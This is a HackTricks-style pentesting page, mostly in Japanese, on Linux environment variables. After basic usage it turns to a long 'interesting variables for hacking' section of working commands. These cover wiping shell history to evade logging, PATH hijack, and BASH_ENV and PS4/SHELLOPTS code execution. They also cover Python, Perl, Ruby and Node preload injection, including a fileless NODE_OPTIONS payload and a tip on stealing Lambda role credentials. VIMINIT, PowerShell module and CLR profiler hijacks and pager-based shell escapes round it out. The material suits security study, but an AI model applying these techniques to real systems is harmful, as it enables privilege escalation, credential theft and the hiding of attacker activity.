# Linux 環境変数

{{#include ../../banners/hacktricks-training.md}}

## グローバル変数

グローバル変数は**子プロセス**に引き継がれます。

現在のセッション用にグローバル変数を作成するには、次のようにします。

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

この変数は、現在のセッションおよびその子プロセスからアクセスできます。

変数を**削除**するには、次のようにします。

```bash
unset MYGLOBAL
```

## ローカル変数

**ローカル変数**には、**現在のシェル／スクリプト**からのみ**アクセス**できます。

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## 現在の変数一覧

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

`/proc/*/environ` の内容は **NUL区切り** なので、次の形式のほうが通常は読みやすくなります:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

If you are looking for **認証情報** or **興味深いサービス設定** inside inherited environments, also check [Linux Post Exploitation](../post-exploitation/README.md).

## Common variables

出典: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – **X** が使用するディスプレイ。この変数は通常 **:0.0** に設定され、現在のコンピューターの最初のディスプレイを意味します。
- **EDITOR** – ユーザーが優先して使用するテキストエディター。
- **HISTFILESIZE** – history file に含める最大行数。
- **HISTSIZE** – ユーザーがセッションを終了したときに history file に追加される行数。
- **HOME** – ホームディレクトリ。
- **HOSTNAME** – コンピューターのホスト名。
- **LANG** – 現在の言語。
- **MAIL** – ユーザーのメールスプールの場所。通常は **/var/spool/mail/USER**。
- **MANPATH** – マニュアルページを検索するディレクトリの一覧。
- **OSTYPE** – オペレーティングシステムの種類。
- **PS1** – bash のデフォルトプロンプト。
- **PATH** – 相対パスや絶対パスを指定せず、ファイル名だけで実行したいバイナリファイルを含むディレクトリのパスを保存します。
- **PWD** – 現在の作業ディレクトリ。
- **SHELL** – 現在のコマンドシェルへのパス（例: **/bin/bash**）。
- **TERM** – 現在の端末タイプ（例: **xterm**）。
- **TZ** – タイムゾーン。
- **USER** – 現在のユーザー名。

## Interesting variables for hacking

すべての変数が同じように役立つわけではありません。攻撃者の視点では、**検索パス**、**起動ファイル**、**動的リンカーの動作**、または**監査/ログ記録**を変更する変数を優先してください。

### **HISTFILESIZE**

**この変数の値を 0 に変更**すると、**セッション終了時**に **history file** (\~/.bash_history) が **0 行に切り詰められます**。

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

この変数の**値を0に変更**すると、コマンドは**メモリ内の履歴に保持されず**、**履歴ファイル**（\~/.bash_history）にも書き込まれません。

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

**この変数の値が `ignorespace` または `ignoreboth` に設定されている場合**、先頭に余分なスペースを付けたコマンドは履歴に保存されません。

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

**履歴ファイル**を**`/dev/null`**に設定するか、完全に unset します。通常、履歴サイズを変更するだけの場合よりも確実です。

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

プロセスは、**http または https** 経由でインターネットに接続する際、ここで指定された **proxy** を使用します。

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: これらを尊重するツールやプロトコルで使用されるデフォルトのプロキシ。
- `no_proxy`: 直接接続するホスト／ドメイン／CIDRのバイパスリスト。

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

ツールによっては、小文字と大文字のどちらの形式も使用されます（`http_proxy`/`HTTP_PROXY`、`no_proxy`/`NO_PROXY`）。

### SSL_CERT_FILE & SSL_CERT_DIR

プロセスは、**これらの環境変数**で指定された証明書を信頼します。これは、**`curl`**、**`git`**、Python の HTTP クライアント、パッケージマネージャーなどのツールに、攻撃者が制御する CA を信頼させるのに便利です（たとえば、interception proxy を正規のものに見せかけるため）。

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

特権ラッパーやスクリプトが**絶対パスを使わずに**コマンドを実行する場合、`PATH` 内で**攻撃者が制御できる最初のディレクトリ**が優先されます。これが、`sudo`、cron ジョブ、シェルラッパー、カスタム SUID ヘルパーでよく見られる**PATH hijack**の基本原理です。`env_keep+=PATH`、弱い `secure_path`、または `tar`、`service`、`cp`、`python` などを名前だけで呼び出すラッパーを探してください。

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

`PATH`を悪用する権限昇格チェーン全体については、[Linux Privilege Escalation](linux-privilege-escalation/README.md)を確認してください。

### **HOME & XDG_CONFIG_HOME**

`HOME`は単なるディレクトリ参照ではありません。多くのツールは、`$HOME`または`$XDG_CONFIG_HOME`から**dotfiles**、**plugins**、**ユーザーごとの設定**を自動的に読み込みます。特権ワークフローでこれらの値が引き継がれる場合、バイナリの乗っ取りよりも**config injection**のほうが容易な可能性があります。

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

興味深いターゲットには、`.gitconfig`、`.wgetrc`、`.curlrc`、`.inputrc`、`.pythonrc.py`、および `.terraformrc` などのツール固有のファイルがあります。

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

これらの変数は**動的リンカー**に影響します。

- `LD_PRELOAD`: 追加の共有オブジェクトを最初に読み込ませます。
- `LD_LIBRARY_PATH`: ライブラリ検索ディレクトリを先頭に追加します。
- `LD_AUDIT`: ライブラリの読み込みとシンボル解決を監視する auditor ライブラリを読み込みます。

特権コマンドがこれらの環境変数を保持する場合、**フック**、**インストルメンテーション**、**権限昇格**に非常に有用です。**secure-execution** モード（`AT_SECURE`。例: setuid/setgid/capabilities）では、ローダーはこれらの環境変数の多くを削除するか、使用を制限します。ただし、このローダーの初期段階にあるパーサーのバグは、ターゲットプログラムより**前に**実行されるため、依然として影響が非常に大きくなります。<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` は glibc の初期動作（allocator tunables など）を変更し、exploit lab で非常に便利です。セキュリティの観点でも重要です。**dynamic loader が非常に早い段階でこれを解析する**ためです。2023 年の **Looney Tunables** bug は、loader が解析する環境変数 1 つが、SUID プログラムに対する**ローカル権限昇格の手段**になり得ることを示す好例でした。<sup>[[6]](#references)</sup>

CVE-2023-4911 については、**インストール済みのディストリビューションパッケージのリリース**をベンダーが修正したリリースと比較し、新しいプロセスで実際に使用される loader を確認してください。upstream のバージョン文字列だけでは判断できません。Debian は影響を受ける parser を 2.31 パッケージにバックポートしていた一方、ディストリビューションによっては upstream の番号を変更せずに修正をバックポートしていました。また、実際に権限を移行するには、`NoNewPrivs`、`nosuid` マウント、その他の緩和策によって ID の変更が阻止されない、特権付き実行可能ファイルが必要です。受動的な列挙中に、不正な `GLIBC_TUNABLES` を使ったクラッシュ調査を実行するのは避けてください。リリースごとの該当状況については、[Ubuntu tracker](https://ubuntu.com/security/CVE-2023-4911)、[Debian tracker](https://security-tracker.debian.org/tracker/CVE-2023-4911)、[Red Hat advisory](https://access.redhat.com/security/cve/cve-2023-4911) を参照してください。Ubuntu の [security notice](https://ubuntu.com/security/notices/USN-6409-1) では、更新後の再起動も求められています。

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

**Bash** が**非対話モード**で起動されると、対象スクリプトを実行する前に `BASH_ENV` を確認し、そのファイルを source します。Bash が `sh` として起動された場合や、POSIX 形式の対話モードでは、`ENV` も参照されることがあります。これは、攻撃者が環境変数を制御できる場合に、シェルラッパーをコード実行の手段に変える古典的な手法です。

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash は **real/effective IDs が異なる**場合、これらの startup files を無視します。`-p` は effective ID を保持しますが、これらの startup files を有効にはしないため、正確な動作は wrapper が shell をどのように起動するかによって異なります。Bash の起動前に `setuid()`/`setgid()` を呼び出す特権 wrapper には注意してください。ID が再び一致すると、Bash は、それがなければ無視される `BASH_ENV`、`ENV` および関連する shell state を信頼する可能性があります。<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Bash で **xtrace** が有効になっていると、各トレース対象コマンドの前に `PS4` を展開して出力します。`PS4` は prompt と同様に展開されるため、その中の **command substitution** が実行されます。重要なのは、環境変数 `SHELLOPTS=xtrace` を export するだけで xtrace を有効にできることです。コマンドラインで `-x` を指定する必要はありません。つまり、被害者が実行する Bash script はどれも code execution につながる可能性があります。<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` は xtrace が有効になるまで何もしません（`SHELLOPTS=xtrace`、`set -x`、または `bash -x`）。また、Bash は `BASH_ENV` と同様に、特権/setuid コンテキストでは `SHELLOPTS` を破棄します。

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

これらの変数は Python の起動方法を変更します。

- `PYTHONPATH`: import の検索パスを先頭に追加します。
- `PYTHONHOME`: 標準ライブラリのツリーの場所を変更します。
- `PYTHONSTARTUP`: 対話プロンプトの前にファイルを実行します。
- `PYTHONINSPECT=1`: スクリプトの終了後に対話モードに移行します。
- `PYTHONBREAKPOINT`: コードが `breakpoint()` に到達したときに呼び出される `package.module.callable`（およびその module が import されます）。<sup>[[8]](#references)</sup>

これらは、制御可能な環境変数を使って Python を呼び出す保守用スクリプト、debugger、shell、wrapper に対して有効です。`python -E` と `python -I` は、すべての `PYTHON*` 変数を無視します。

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

最近の実例として、2024年にUbuntu/Debianシステムで発生した**needrestart**のLPEがあります。root所有のスキャナーが、`/proc/<PID>/environ`から非特権プロセスの`PYTHONPATH`をコピーし、その後Pythonを実行していました。公開されたexploitでは、攻撃者が制御するパスに`importlib/__init__.so`を配置し、ヘルパーにハードコードされたスクリプトが関係する前に、Python自身の初期化中に攻撃者のコードを実行させていました。<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perlにも、同様に有用な起動時変数があります。

- `PERL5LIB`: ライブラリディレクトリを検索パスの先頭に追加します。
- `PERL5OPT`: すべての`perl`コマンドラインに指定されているかのように、スイッチを注入します。

これにより、ターゲットスクリプトが何か重要な処理を始める前に、**自動モジュール読み込み**を強制したり、インタープリターの動作を変更したりできます。Perlは**taint / setuid / setgid**コンテキストではこれらの変数を無視しますが、通常のroot実行ラッパー、CIジョブ、インストーラー、独自のsudoersルールでは依然として重要です。

sudoルールで環境変数の上書きが許可されており、特権コマンドが最終的にPerlを起動する場合は、`PERL5DB`も確認してください。Perlのドキュメントによると、`PERL5OPT=-d`はデバッガーを起動し、Perlが単独の`-d`スイッチで起動した場合、`PERL5DB`がデバッガーの初期化コードを指定します。`PERL5LIB`と`PERLLIB`だけを解除しても、この経路は塞がれません。これらの変数がsudoとラッパーを通過してPerlプロセスに届く必要があり、またPerlがtaintまたはset-ID処理によってそれらを無視しないことが条件です。列挙中に特権ヘルパーを実行せず、該当するルールと実行チェーンを正確に調査してください。[perlrunの環境変数リファレンス](https://perldoc.perl.org/perlrun#ENVIRONMENT)を参照してください。

環境変数が引き継がれない場合でも、Perl組み込みの[`@INC`検索パス](https://perldoc.perl.org/perlvar#@INC)は、別のモジュール信頼境界になります。特権Perlプロセスについては、実際の`use`または`require`文を、解決されるモジュール名、検索順序、および検索対象ディレクトリ内で低権限ユーザーがそのモジュールを作成または置換できるかどうかと照合してください。ライブラリディレクトリが書き込み可能というだけでは、特権プロセスがそこからコードを読み込むとは限りません。

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS`は、環境を継承するすべての`node`プロセスに**Node.js CLI flags**を追加します。そのため、最終的にNodeを呼び出すwrapper、CI job、Electron helper、sudo ruleに対して有効です。攻撃側で特に注目されるflagは、通常次のとおりです。

- `--require <file>`: 対象のscriptより前にCommonJS fileをpreloadします。
- `--import <module>`: 対象のscriptより前にES moduleをpreloadします。

Nodeは`NODE_OPTIONS`内の危険なflagの一部を拒否しますが、`--require`と`--import`は明示的に許可されており、通常のコマンドライン引数より**前に**処理されます。<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### `data:` URLを使ったファイルレス preload

`NODE_OPTIONS`を設定できても、対象上で**ファイルを書き込めない**場合（読み取り専用ファイルシステム、制限されたAPI、serverless runtimeなど）、`--import`は`data:text/javascript,` URLを受け付けるため、payload全体を環境変数内に含められます。JavaScriptは**完全にURLエンコード**する必要があります。Nodeは値をURLとして解析するため、エンコードされていない空白（またはその他の文字）があると、payloadが途中で切れて`SyntaxError`が発生します。これは、`--import`が`NODE_OPTIONS`のallowlistに含まれるNode 20.6以降で動作します。<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> これは、Nodeを実行する**マネージドクラウドランタイム**で、`NODE_OPTIONS`の制御をRCEにつなげる一般的な方法です。たとえば、Lambdaの設定のみを変更できる攻撃者（`lambda:UpdateFunctionConfiguration`は可能だが、`iam:PassRole`とコードの更新は不可）は、`NODE_OPTIONS=--import data:text/javascript,<payload>`を注入して関数内でコードを実行し、その実行ロールの認証情報を盗み出せます。注入されたモジュールはハンドラーより**前に**実行され、その後ハンドラーも通常どおり実行されます。

`NODE_OPTIONS`を間接的に設定するリモートgadget chain（たとえば、prototype pollutionからRCEにつなげる手法）については、[こちらのページ](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md)を確認してください。

### **RUBYLIB & RUBYOPT**

Rubyにも、同様の起動時悪用手法があります。

- `RUBYLIB`: Rubyのロードパスの先頭にディレクトリを追加します。
- `RUBYOPT`: すべての`ruby`実行に`-r`などのコマンドラインオプションを注入します。

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

2024年の**needrestart**の脆弱性は、これが単なるラボでの小技ではないことを示しました。`PYTHONPATH` の悪用に対して脆弱だったのと同じ root 所有のヘルパーを、攻撃者が制御する `RUBYLIB` を使って Ruby を実行し、攻撃者のディレクトリから `enc/encdb.so` を読み込むよう仕向けることもできました。<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim は通常の起動時に、`VIMINIT`（またはフォールバック先の `EXINIT`）に含まれる Ex コマンドを実行します。Ex コマンドには `:!cmd` や `:call system(...)` が含まれるため、この変数を制御すれば、被害者が Vim を開くたびにコードを実行できます（root の `sudo vim`、`crontab -e`、`visudo`、`$EDITOR` を起動する `git`/`less` など）。<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Batch mode（`vim -es`/`-Es`）ではこれらの変数はスキップされますが、通常の対話型起動では実行されます。

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core（`pwsh`）は Linux/macOS（および Windows）上で動作する**.NET アプリケーション**です。そのため、複数の環境変数を設定すると、環境を継承した `pwsh` の呼び出しで code execution を引き起こせます。これは、cron/systemd ジョブ、CI runner、`pwsh` を呼び出す特権ラッパーへの攻撃に役立ちます。

- `PSModulePath`: PowerShell はこのリスト内のすべてのディレクトリを再帰的に検索して `.psd1`/`.psm1` モジュールを探し、そのモジュールがエクスポートするコマンドが初めて参照されたときに **auto-load** します。ディレクトリを先頭に追加すると、モジュールのトップレベルコードがインポート時に実行されます。また、コマンド解決順は *Alias → Function → Cmdlet* のため、エクスポートされた関数で被害者が呼び出す組み込み Cmdlet を shadow することもできます。<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: `powershell/Microsoft.PowerShell_profile.ps1` の場所を変更します。このファイルは起動時に実行されます（`-NoProfile` を指定した場合を除く）。
- `DOTNET_STARTUP_HOOKS`: `StartupHook.Initialize()` が `Main` より前に実行される managed assembly です（すべての .NET アプリで共有されます）。
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: CLR profiling API によって、起動時に攻撃者のライブラリがプロセスへ読み込まれます（パス変数はレジストリより優先されます。`DOTNET_*` は新しい別名です）。Windows PowerShell 5.1（.NET Framework）では `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH` を使います。MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

Windowsでは、`PSExecutionPolicyPreference=Bypass`を設定すると、「unsigned scripts blocked」というガードレールも解除されるため、仕込まれたprofile/moduleが実際に実行されます。完全なPoCについては専用ページを参照してください。

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

環境変数からパスを読み取るだけでなく、その値を**shell**、**editor**、または**input preprocessor**に渡すツールもあります。そのため、特権wrapperが`git`、`man`、`less`などのテキストビューアを実行する場合、次の変数は特に注目に値します。

- `PAGER`、`MANPAGER`、`GIT_PAGER`: pagerコマンドを指定します。
- `GIT_EDITOR`、`VISUAL`、`EDITOR`: editorコマンドを指定します。引数を含むこともよくあります。
- `LESSOPEN`、`LESSCLOSE`: `less`がファイルを開くときに実行されるpre/post-processorを定義します。

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git は、`GIT_CONFIG_COUNT`、`GIT_CONFIG_KEY_<n>`、`GIT_CONFIG_VALUE_<n>` を使って、ディスクに触れることなく**環境変数のみで config を注入**する方法にも対応しています。

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

ポストエクスプロイトの観点では、継承された環境変数には**認証情報**、**プロキシ設定**、**サービストークン**、**クラウドキー**が含まれていることも多いため、忘れずに確認してください。`/proc/<PID>/environ` と `systemd` の `Environment=` の探索については、[Linux Post Exploitation](../post-exploitation/README.md) を確認してください。

### PS1

プロンプトの表示方法を変更します。

[**これは一例です**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

root:

![PERL5OPT & PERL5LIB - PS1: これは一例です](<../images/image (897).png>)

一般ユーザー:

![PERL5OPT & PERL5LIB - PS1: バックグラウンドジョブが1つ、2つ、3つある場合](<../images/image (740).png>)

バックグラウンドジョブが1つ、2つ、3つある場合:

![PERL5OPT & PERL5LIB - PS1: バックグラウンドジョブが1つ、2つ、3つある場合](<../images/image (145).png>)

バックグラウンドジョブが1つ、一時停止中のジョブが1つあり、最後のコマンドが正常に終了しなかった場合:

![PERL5OPT & PERL5LIB - PS1: バックグラウンドジョブが1つ、一時停止中のジョブが1つあり、最後のコマンドが正常に終了しなかった場合](<../images/image (715).png>)

## References

- [1] [GNU Bash マニュアル - Bash の起動ファイル](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux man ページ](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - needrestart の LPE](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI ドキュメント - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [一般的な環境変数 - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - glibc の ld.so におけるローカル権限昇格 - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [GNU Bash マニュアル - Bash 変数 (`PS4`) と Set 組み込みコマンド (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - 組み込み関数 breakpoint() と PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Vim ドキュメント - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath と PowerShell モジュールの自動読み込み](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [.NET のデバッグおよびプロファイリング設定 (`CORECLR_`/`DOTNET_`/`COR_` プロファイラー変数)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
